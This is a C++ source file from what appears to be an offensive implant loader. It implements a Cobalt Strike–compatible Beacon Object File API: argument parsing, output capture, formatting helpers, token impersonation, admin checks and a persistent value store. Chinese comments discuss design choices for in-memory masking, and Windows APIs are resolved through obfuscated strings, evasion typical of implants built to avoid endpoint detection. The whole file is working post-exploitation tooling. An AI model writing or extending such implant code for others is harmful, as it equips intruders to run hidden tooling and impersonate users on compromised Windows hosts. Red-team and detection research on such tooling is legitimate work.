#include "Core/Loader/BOF/BofApi.hpp"

#ifdef _WIN32

#include "Core/Native/Win/ApiResolver.hpp"

#include <windows.h>

#include <atomic>
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <unordered_map>

namespace cleat {
    namespace bof {

        namespace {

            // 当前线程的执行上下文(每个 BOF 独占一条命令线程, 见 BofApi.hpp 文件头)。
            // **TLS 已禁**(DLL 形态掩码前提, ): thread_local 会给 DLL 引入
            // 静态 TLS 目录 → TLS 回调在掩码窗口期执行镜像内代码 → 崩溃。改为互斥
            // map<线程id, 上下文> —— 语义逐字保留: 本线程的 ctx; 外来线程(BOF 自
            // spawn)查不到 = nullptr(输出丢弃, 见文件头"已知边界")。
            std::mutex& CtxMutex() {
                static std::mutex m;
                return m;
            }
            std::map<std::thread::id, ExecContext*>& CtxMap() {
                static std::map<std::thread::id, ExecContext*> m;
                return m;
            }

            void AppendOutput(const char* data, size_t len) {
                std::lock_guard<std::mutex> lock(CtxMutex());
                const auto it = CtxMap().find(std::this_thread::get_id());
                ExecContext* ctx = (it != CtxMap().end()) ? it->second : nullptr;
                if (!ctx || !data || len == 0) {
                    return;   // 外来线程(BOF 自spawn)无上下文: 输出丢弃, 见文件头"已知边界"
                }
                const size_t room = kMaxOutputBytes - ctx->output.size();
                if (room == 0) {
                    ctx->truncated = true;
                    return;
                }
                const size_t take = len > room ? room : len;
                ctx->output.append(data, take);
                if (take < len) {
                    ctx->truncated = true;
                }
            }

            // ---- 内部 API 的全局状态 ----

            // AddValue/GetValue/RemoveValue: CS 语义为**会话级**持久, 且 loader 每次
            // 执行后释放节区 —— 存进去的指针必然跨执行, 这是 CS 自己的设计取舍,
            // 原样保留(BOF 作者自担其指针生命周期)。
            std::mutex& ValuesMutex() {
                static std::mutex m;
                return m;
            }
            std::unordered_map<std::string, void*>& Values() {
                static std::unordered_map<std::string, void*> v;
                return v;
            }

            std::atomic<void*>& StoredToken() {
                static std::atomic<void*> t{ nullptr };
                return t;
            }

        } // namespace

        // ---- 上下文挂接 ----

        ExecContext* CurrentContext() {
            std::lock_guard<std::mutex> lock(CtxMutex());
            const auto it = CtxMap().find(std::this_thread::get_id());
            return (it != CtxMap().end()) ? it->second : nullptr;
        }

        void SetCurrentContext(ExecContext* ctx) {
            std::lock_guard<std::mutex> lock(CtxMutex());
            if (ctx) {
                CtxMap()[std::this_thread::get_id()] = ctx;
            }
            else {
                CtxMap().erase(std::this_thread::get_id());
            }
        }

        // ---- 参数解析(与 CS debug 参考实现同语义) ----

        void BeaconDataParse(DataParser* parser, char* data, int size) {
            if (!parser) {
                return;
            }
            parser->original = data;
            parser->buffer = data;
            parser->length = size;
            parser->size = size;
        }

        int BeaconDataInt(DataParser* parser) {
            if (!parser || parser->length < 4) {
                return 0;
            }
            int v = 0;
            memcpy(&v, parser->buffer, sizeof(v));
            parser->buffer += 4;
            parser->length -= 4;
            return v;
        }

        short BeaconDataShort(DataParser* parser) {
            if (!parser || parser->length < 2) {
                return 0;
            }
            short v = 0;
            memcpy(&v, parser->buffer, sizeof(v));
            parser->buffer += 2;
            parser->length -= 2;
            return v;
        }

        int BeaconDataLength(DataParser* parser) {
            return parser ? parser->length : 0;
        }

        char* BeaconDataExtract(DataParser* parser, int* size) {
            if (!parser) {
                if (size) *size = 0;
                return nullptr;
            }
            // CS 口径: str/wstr 均为 4 字节长度前缀 + 数据
            const int len = BeaconDataInt(parser);
            char* out = nullptr;
            if (len >= 0 && parser->length >= len) {
                out = parser->buffer;
                parser->buffer += len;
                parser->length -= len;
            }
            if (size) {
                *size = len;
            }
            return out;
        }

        // ---- 输出 ----

        void BeaconOutput(int type, const char* data, int len) {
            (void)type;   // v1 不区分输出通道, 统一收集
            AppendOutput(data, len > 0 ? static_cast<size_t>(len) : 0);
        }

        void BeaconPrintf(int type, const char* fmt, ...) {
            (void)type;
            if (!fmt) {
                return;
            }
            char buf[4096];
            va_list ap;
            va_start(ap, fmt);
            const int written = vsnprintf(buf, sizeof(buf), fmt, ap);
            va_end(ap);
            if (written <= 0) {
                return;
            }
            AppendOutput(buf, written >= static_cast<int>(sizeof(buf))
                ? sizeof(buf) - 1
                : static_cast<size_t>(written));
        }

        // ---- 格式化 ----

        void BeaconFormatAlloc(Format* f, int maxsz) {
            if (!f || maxsz <= 0) {
                return;
            }
            f->original = static_cast<char*>(std::malloc(static_cast<size_t>(maxsz)));
            f->buffer = f->original;
            f->length = 0;
            f->size = f->original ? maxsz : 0;
        }

        void BeaconFormatReset(Format* f) {
            if (!f) {
                return;
            }
            f->buffer = f->original;
            f->length = 0;
        }

        void BeaconFormatFree(Format* f) {
            if (!f) {
                return;
            }
            std::free(f->original);
            f->original = nullptr;
            f->buffer = nullptr;
            f->length = 0;
            f->size = 0;
        }

        void BeaconFormatAppend(Format* f, const char* text, int len) {
            if (!f || !f->buffer || !text || len <= 0 || f->length + len > f->size) {
                return;
            }
            memcpy(f->buffer, text, static_cast<size_t>(len));
            f->buffer += len;
            f->length += len;
        }

        void BeaconFormatPrintf(Format* f, const char* fmt, ...) {
            if (!f || !f->buffer || !fmt) {
                return;
            }
            const int room = f->size - f->length;
            if (room <= 0) {
                return;
            }
            va_list ap;
            va_start(ap, fmt);
            const int written = vsnprintf(f->buffer, static_cast<size_t>(room), fmt, ap);
            va_end(ap);
            if (written <= 0) {
                return;
            }
            const int take = written >= room ? room - 1 : written;
            f->buffer += take;
            f->length += take;
        }

        char* BeaconFormatToString(Format* f) {
            if (!f || !f->original) {
                return nullptr;
            }
            if (f->length < f->size) {
                f->original[f->length] = '\0';   // CS 口径: 就地补 NUL
            }
            return f->original;
        }

        void BeaconFormatInt(Format* f, int value) {
            if (!f || !f->buffer || f->length + 4 > f->size) {
                return;
            }
            const uint32_t v = static_cast<uint32_t>(value);
            unsigned char be[4] = {
                static_cast<unsigned char>(v >> 24),
                static_cast<unsigned char>(v >> 16),
                static_cast<unsigned char>(v >> 8),
                static_cast<unsigned char>(v),
            };
            memcpy(f->buffer, be, sizeof(be));
            f->buffer += 4;
            f->length += 4;
        }

        // ---- 内部 API ----

        void BeaconUseToken(void* token) {
            if (!token) {
                return;
            }
            StoredToken().store(token);
            using ImpersonateFn = BOOL(WINAPI*)(HANDLE);
            const auto pImpersonate = ApiResolver::Proc<ImpersonateFn>(
                OBF_STR("advapi32.dll"), OBF_STR("ImpersonateLoggedOnUser"));
            if (pImpersonate) {
                pImpersonate(static_cast<HANDLE>(token));
            }
        }

        void BeaconRevertToken() {
            using RevertFn = BOOL(WINAPI*)();
            const auto pRevert = ApiResolver::Proc<RevertFn>(
                OBF_STR("advapi32.dll"), OBF_STR("RevertToSelf"));
            if (pRevert) {
                pRevert();
            }
            StoredToken().store(nullptr);
        }

        BOOL BeaconIsAdmin() {
            using AllocSidFn = BOOL(WINAPI*)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD,
                DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
            using CheckMemberFn = BOOL(WINAPI*)(HANDLE, PSID, PBOOL);
            using FreeSidFn = PVOID(WINAPI*)(PSID);
            const auto pAllocSid = ApiResolver::Proc<AllocSidFn>(
                OBF_STR("advapi32.dll"), OBF_STR("AllocateAndInitializeSid"));
            const auto pCheckMember = ApiResolver::Proc<CheckMemberFn>(
                OBF_STR("advapi32.dll"), OBF_STR("CheckTokenMembership"));
            const auto pFreeSid = ApiResolver::Proc<FreeSidFn>(
                OBF_STR("advapi32.dll"), OBF_STR("FreeSid"));
            if (!pAllocSid || !pCheckMember) {
                return FALSE;
            }
            SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
            PSID adminGroup = nullptr;
            if (!pAllocSid(&ntAuthority, 2,
                SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                0, 0, 0, 0, 0, 0, &adminGroup)) {
                return FALSE;
            }
            BOOL isMember = FALSE;
            pCheckMember(nullptr, adminGroup, &isMember);
            if (pFreeSid) {
                pFreeSid(adminGroup);
            }
            return isMember;
        }

        void* BeaconAddValue(const char* key, void* value) {
            if (!key) {
                return nullptr;
            }
            std::lock_guard<std::mutex> lock(ValuesMutex());
            Values()[key] = value;
            return value;
        }

        void* BeaconGetValue(const char* key) {
            if (!key) {
                return nullptr;
            }
            std::lock_guard<std::mutex> lock(ValuesMutex());
            const auto it = Values().find(key);
            return it == Values().end() ? nullptr : it->second;
        }

        void* BeaconRemoveValue(const char* key) {
            if (!key) {
                return nullptr;
            }
            std::lock_guard<std::mutex> lock(ValuesMutex());
            const auto it = Values().find(key);
            if (it == Values().end()) {
                return nullptr;
            }
            void* v = it->second;
            Values().erase(it);
            return v;
        }

        // ---- API 表(loader 按符号名明文查此表) ----

        const ApiEntry* ApiTable(size_t& count) {
            static const ApiEntry kTable[] = {
                // 参数解析
                { "BeaconDataParse",   reinterpret_cast<void*>(BeaconDataParse) },
                { "BeaconDataInt",     reinterpret_cast<void*>(BeaconDataInt) },
                { "BeaconDataShort",   reinterpret_cast<void*>(BeaconDataShort) },
                { "BeaconDataLength",  reinterpret_cast<void*>(BeaconDataLength) },
                { "BeaconDataExtract", reinterpret_cast<void*>(BeaconDataExtract) },
                // 输出
                { "BeaconOutput",      reinterpret_cast<void*>(BeaconOutput) },
                { "BeaconPrintf",      reinterpret_cast<void*>(BeaconPrintf) },
                // 格式化
                { "BeaconFormatAlloc",   reinterpret_cast<void*>(BeaconFormatAlloc) },
                { "BeaconFormatReset",   reinterpret_cast<void*>(BeaconFormatReset) },
                { "BeaconFormatAppend",  reinterpret_cast<void*>(BeaconFormatAppend) },
                { "BeaconFormatPrintf",  reinterpret_cast<void*>(BeaconFormatPrintf) },
                { "BeaconFormatToString", reinterpret_cast<void*>(BeaconFormatToString) },
                { "BeaconFormatFree",    reinterpret_cast<void*>(BeaconFormatFree) },
                { "BeaconFormatInt",     reinterpret_cast<void*>(BeaconFormatInt) },
                // 内部 API
                { "BeaconUseToken",    reinterpret_cast<void*>(BeaconUseToken) },
                { "BeaconRevertToken", reinterpret_cast<void*>(BeaconRevertToken) },
                { "BeaconIsAdmin",     reinterpret_cast<void*>(BeaconIsAdmin) },
                { "BeaconAddValue",    reinterpret_cast<void*>(BeaconAddValue) },
                { "BeaconGetValue",    reinterpret_cast<void*>(BeaconGetValue) },
                { "BeaconRemoveValue", reinterpret_cast<void*>(BeaconRemoveValue) },
            };
            count = sizeof(kTable) / sizeof(kTable[0]);
            return kTable;
        }

    } // namespace bof
} // namespace cleat

#endif // _WIN32
